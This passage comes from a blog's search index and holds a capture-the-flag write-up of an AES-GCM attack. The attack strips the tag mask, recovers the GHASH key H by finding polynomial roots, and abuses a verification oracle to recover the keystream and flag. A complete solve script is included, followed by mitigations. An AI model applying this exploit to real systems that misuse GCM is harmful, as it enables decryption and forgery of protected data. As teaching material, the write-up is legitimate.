polynomial equation in H over $\\text{GF}(2^{128})$: $$C_1 \\cdot H^{n+1} + C_2 \\cdot H^n + \\cdots + C_n \\cdot H^2 + L \\cdot H - \\text{GHASH}_{\\text{flag}} = 0$$ We solve this using SageMath’s polynomial root finding: def recover_h(coeffs, target_val): \"\"\" Solve: coeffs[0]*H^n + coeffs[1]*H^(n-1) + ... + coeffs[n-1]*H - target_val = 0 \"\"\" F = GF(2) P.\u003cx\u003e = PolynomialRing(F) irr_poly = x^128 + x^7 + x^2 + x + 1 # GCM's irreducible polynomial GFghash.\u003cy\u003e = GF(2^128, modulus=irr_poly) # Build polynomial poly_terms = [] for i, c in enumerate(coeffs): power = len(coeffs) - i poly_terms.append(to_field(c) * y^power) poly = sum(poly_terms) - to_field(target_val) roots = poly.roots() return from_field(roots[0][0]) # Recover H target_val = bytes_to_long(flag_tag) ^ mask pad_len = (16 - len(flag_ct) % 16) % 16 ct_padded = flag_ct + b'\\0' * pad_len coeffs = [bytes_to_long(ct_padded[i:i+16]) for i in range(0, len(ct_padded), 16)] coeffs.append((0 \u003c\u003c 64) | (len(flag_ct) * 8)) # Length block H = recover_h(coeffs, target_val) print(f\"[+] Recovered H: {hex(H)}\") Why This Works The polynomial has degree at most $n+1$ (number of ciphertext blocks + 1). Since we know all coefficients and the target value, there’s typically only one valid root in $\\text{GF}(2^{128})$ that corresponds to the actual H value. ","date":"2025-01-16","objectID":"/posts/black-hat/:4:2","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Phase 3: Keystream Recovery via Oracle With H recovered, we can now abuse the verification oracle. The key observation: For any partial ciphertext and AAD, we can compute the required AAD value that makes verification succeed! Strategy: Encrypt $\\texttt{0x00} \\times \\text{len(flag)}$ to get a reference tag, then brute-force the keystream byte-by-byte. First, get a reference tag: io.sendlineafter(b\"your_text2:\", b\"\\x00\" * len(flag_ct)) io.recvuntil(b\"tag2: \") tag2 = bytes_to_long(base64.b64decode(io.recvline().strip())) keystream = b\"\" target_tag = tag2 ^ mask # Target GHASH value For each byte position $i$: Guess the keystream byte (0-255) Calculate partial GHASH of guessed ciphertext + length block Solve for required AAD that makes the tag verify Query oracle with this AAD The math for step 3: $$\\text{GHASH}(H, A, C) = A \\cdot H^{n+2} + C_1 \\cdot H^{n+1} + \\cdots + C_n \\cdot H^2 + L \\cdot H$$ Rearranging to solve for $A$: $$A = \\frac{\\text{target} \\oplus (C_1 \\cdot H^{n+1} + \\cdots + L \\cdot H)}{H^{n+2}}$$ for i in range(len(flag_ct)): curr_len = i + 1 n_blocks = (curr_len + 15) // 16 len_bits_val = (128 \u003c\u003c 64) | (curr_len * 8) # Precompute H^(-(n_blocks+2)) for AAD calculation h_inv = gcm.inv(gcm.pow(H, n_blocks + 2)) for b in range(256): guess_ks = keystream + bytes([b]) # Calculate GHASH of ciphertext blocks + length c_padded = guess_ks + b'\\0' * ((16 - len(guess_ks) % 16) % 16) y = 0 for k in range(0, len(c_padded), 16): blk = bytes_to_long(c_padded[k:k+16]) y = gcm.mul(y ^ blk, H) y = gcm.mul(y ^ len_bits_val, H) # Calculate required AAD: A = (target ⊕ y) * H^(-(n_blocks+2)) aad_val = gcm.mul(target_tag ^ y, h_inv) aad_bytes = long_to_bytes(aad_val, 16).rjust(16, b'\\0') # Verify with oracle io.sendline(str(curr_len).encode()) io.sendline(base64.b64encode(aad_bytes)) if b\"True\" in io.recvline(): keystream += bytes([b]) print(f\"\\r[+] Progress: {keystream.hex()}\", end=\"\") break Finally, decrypt the flag: flag = strxor(flag_ct, keystream) print(f\"\\n[+] FLAG: {flag.decode()}\") ","date":"2025-01-16","objectID":"/posts/black-hat/:4:3","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Full Solution Script #!/usr/bin/env python3 from pwn import * from Crypto.Util.number import * from Crypto.Util.strxor import strxor import base64 import sys from sage.all import * class GCMHelper: \"\"\"Helper for GF(2^128) operations used in GCM\"\"\" def __init__(self): F = GF(2) P.\u003cx\u003e = PolynomialRing(F) self.irr = x^128 + x^7 + x^2 + x + 1 self.GFghash.\u003cy\u003e = GF(2^128, modulus=self.irr) def to_field(self, val): bits = bin(val)[2:].zfill(128) coeffs = [int(b) for b in bits[::-1]] return self.GFghash(coeffs) def from_field(self, elem): coeffs = elem.polynomial().list() return int(''.join(str(c) for c in coeffs[::-1]), 2) def mul(self, a, b): return self.from_field(self.to_field(a) * self.to_field(b)) def pow(self, base, exp): return self.from_field(self.to_field(base) ^ exp) def inv(self, a): return self.from_field(self.to_field(a)^(-1)) def to_field(val): F = GF(2) P.\u003cx\u003e = PolynomialRing(F) irr_poly = x^128 + x^7 + x^2 + x + 1 GFghash.\u003cy\u003e = GF(2^128, modulus=irr_poly) bits = bin(val)[2:].zfill(128) coeffs = [int(b) for b in bits[::-1]] return GFghash(coeffs) def from_field(elem): coeffs = elem.polynomial().list() return int(''.join(str(c) for c in coeffs[::-1]), 2) def recover_h(coeffs, target_val): \"\"\" Solve polynomial: coeffs[0]*H^n + ... + coeffs[-1]*H - target_val = 0 over GF(2^128) to recover authentication key H \"\"\" F = GF(2) P.\u003cx\u003e = PolynomialRing(F) irr_poly = x^128 + x^7 + x^2 + x + 1 GFghash.\u003cy\u003e = GF(2^128, modulus=irr_poly) poly_terms = [] for i, c in enumerate(coeffs): power = len(coeffs) - i poly_terms.append(to_field(c) * y^power) poly = sum(poly_terms) - to_field(target_val) roots = poly.roots() if not roots: raise ValueError(\"No roots found!\") return from_field(roots[0][0]) def solve(): if len(sys.argv) \u003c 3: print(f\"Usage: {sys.argv[0]} \u003cHOST\u003e \u003cPORT\u003e\") sys.exit(1) io = remote(sys.argv[1], int(sys.argv[2])) gcm = GCMHelper() # 1. Get Flag Ciphertext and Tag io.recvuntil(b\"flag ciphertext: \") flag_ct = base64.b64decode(io.recvline().strip()) io.recvuntil(b\"flag tag: \") flag_tag = base64.b64decode(io.recvline().strip()) print(f\"[*] Flag ciphertext length: {len(flag_ct)} bytes\") # 2. Recover Mask (encrypt empty string) io.sendlineafter(b\"your_text1:\", b\"\") io.recvuntil(b\"tag1: \") mask = bytes_to_long(base64.b64decode(io.recvline().strip())) print(f\"[+] Recovered mask: {hex(mask)}\") # 3. Recover Authentication Key H target_val = bytes_to_long(flag_tag) ^ mask pad_len = (16 - len(flag_ct) % 16) % 16 ct_padded = flag_ct + b'\\0' * pad_len coeffs = [bytes_to_long(ct_padded[i:i+16]) for i in range(0, len(ct_padded), 16)] coeffs.append((0 \u003c\u003c 64) | (len(flag_ct) * 8)) H = recover_h(coeffs, target_val) print(f\"[+] Recovered H: {hex(H)}\") # 4. Recover Keystream via Oracle io.sendlineafter(b\"your_text2:\", b\"\\x00\" * len(flag_ct)) io.recvuntil(b\"tag2: \") tag2 = bytes_to_long(base64.b64decode(io.recvline().strip())) keystream = b\"\" target_tag = tag2 ^ mask print(\"[*] Brute-forcing keystream byte-by-byte...\") for i in range(len(flag_ct)): curr_len = i + 1 n_blocks = (curr_len + 15) // 16 len_bits_val = (128 \u003c\u003c 64) | (curr_len * 8) h_inv = gcm.inv(gcm.pow(H, n_blocks + 2)) found = False for b in range(256): guess_ks = keystream + bytes([b]) c_padded = guess_ks + b'\\0' * ((16 - len(guess_ks) % 16) % 16) y = 0 for k in range(0, len(c_padded), 16): blk = bytes_to_long(c_padded[k:k+16]) y = gcm.mul(y ^ blk, H) y = gcm.mul(y ^ len_bits_val, H) aad_val = gcm.mul(target_tag ^ y, h_inv) aad_bytes = long_to_bytes(aad_val, 16).rjust(16, b'\\0') io.sendline(str(curr_len).encode()) io.sendline(base64.b64encode(aad_bytes)) if b\"True\" in io.recvline(): keystream += bytes([b]) sys.stdout.write(f\"\\r[+] Progress: {i+1}/{len(flag_ct)} - {keystream.hex()}\") sys.stdout.flush() found = True break if not found: print(f\"\\n[!] Failed to recover byte at position {i}\") return print(\"\\n\") # 5. Decrypt Flag flag = strxor(flag_ct, keystream) print(f\"[+] FLAG: {flag.decode(errors='ignore')}\") io.close() if __name__ == \"__main__\": solve() ","date":"2025-01-16","objectID":"/posts/black-hat/:5:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Attack Timeline ┌─────────────────────────┐ │ Phase 1: Mask │ ├─────────────────────────┤ │ Encrypt(\"\") │ │ → tag_empty = mask │ └────────┬────────────────┘ │ ┌────────▼────────────────┐ │ Phase 2: Recover H │ ├─────────────────────────┤ │ GHASH = tag_flag ⊕ mask │ │ Solve polynomial in H │ │ → H recovered │ └────────┬────────────────┘ │ ┌────────▼────────────────┐ │ Phase 3: Keystream │ ├─────────────────────────┤ │ Encrypt(\"\\x00\" * n) │ │ For each byte: │ │ ├─ Guess byte (0-255) │ │ ├─ Compute GHASH │ │ ├─ Solve for AAD │ │ └─ Query oracle │ └────────┬────────────────┘ │ ┌────────▼────────────────┐ │ Phase 4: Decrypt │ ├─────────────────────────┤ │ flag = ct ⊕ keystream │ └─────────────────────────┘ Runtime: ~2-5 minutes (256 queries per byte worst case) ","date":"2025-01-16","objectID":"/posts/black-hat/:6:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Behind the Math ","date":"2025-01-16","objectID":"/posts/black-hat/:7:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Why GCM Authentication is Vulnerable GCM’s authentication relies on the secrecy of H. Once H is known: Forgery: Craft arbitrary (ciphertext, AAD, tag) tuples that verify Plaintext recovery: Use oracle to leak information bit by bit The polynomial structure means: $$\\text{tag} = \\text{poly}(H) \\oplus \\text{mask}$$ If we can: Remove the mask (by encrypting empty string) Know all coefficients of poly(H) except H itself Know the result poly(H) Then we can solve for H algebraically! ","date":"2025-01-16","objectID":"/posts/black-hat/:7:1","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Oracle Abuse Technique The verification oracle checks: $$\\text{GHASH}(H, \\text{AAD}, C) \\stackrel{?}{=} \\text{tag} \\oplus \\text{mask}$$ By controlling AAD and partial ciphertext, we can: Fix all terms except the AAD term Solve for the AAD value that makes the equation true Query the oracle with this AAD This is a chosen-AAD attack that leaks one keystream byte per 256 queries (worst case). ","date":"2025-01-16","objectID":"/posts/black-hat/:7:2","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"GF(2^128) Arithmetic All operations in GHASH are performed in $\\text{GF}(2^{128})$ with irreducible polynomial: $$f(x) = x^{128} + x^7 + x^2 + x + 1$$ This means: Addition is XOR: $a + b = a \\oplus b$ Multiplication is polynomial multiplication modulo $f(x)$ Every non-zero element has a multiplicative inverse ","date":"2025-01-16","objectID":"/posts/black-hat/:7:3","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Mitigations How to Prevent This Attack Never reuse nonces: Each (key, nonce) pair must be used for at most one encryption No verification oracle: Don’t expose tag verification as an oracle to attackers Limit encryption queries: Bound the number of encryptions with the same key Use AES-GCM-SIV: Nonce-misuse resistant variant that derives nonce from plaintext Proper key rotation: Regularly rotate encryption keys In this challenge, all these rules were violated simultaneously! ","date":"2025-01-16","objectID":"/posts/black-hat/:8:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"Key Takeaways GCM is fragile: Nonce reuse + oracle access = complete break Polynomial algebra is powerful: Knowing coefficients lets us solve for unknowns Oracle abuse is subtle: Even a simple True/False oracle can leak full plaintexts Understanding crypto internals matters: Knowing how GHASH works made this challenge straightforward ","date":"2025-01-16","objectID":"/posts/black-hat/:9:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":["Cryptography"],"content":"References AES-GCM Deep Dive by Frederik Reitemeyer - Comprehensive explanation of GCM internals Forbidden Attack: Nonce reuse in AES-GCM NIST SP 800-38D: GCM Specification McGrew, D. A., \u0026 Viega, J. (2004). “The Galois/Counter Mode of Operation (GCM)” Challenge Reflection This challenge demonstrates that implementation flaws can completely bypass cryptographic security. AES-GCM is provably secure under proper usage, but violating its assumptions (unique nonces, no oracle access) turns a secure primitive into a trivial break. The lesson: Security proofs have assumptions. Violate them at your peril. ","date":"2025-01-16","objectID":"/posts/black-hat/:10:0","tags":["blackhat-finals","crypto","aes-gcm","polynomial","oracle"],"title":"TDS","uri":"/posts/black-hat/"},{"categories":null,"content":"Welcome to my friends page! ","date":"0001-01-01","objectID":"/friend/:0:0","tags":null,"title":"Friends","uri":"/friend/"}]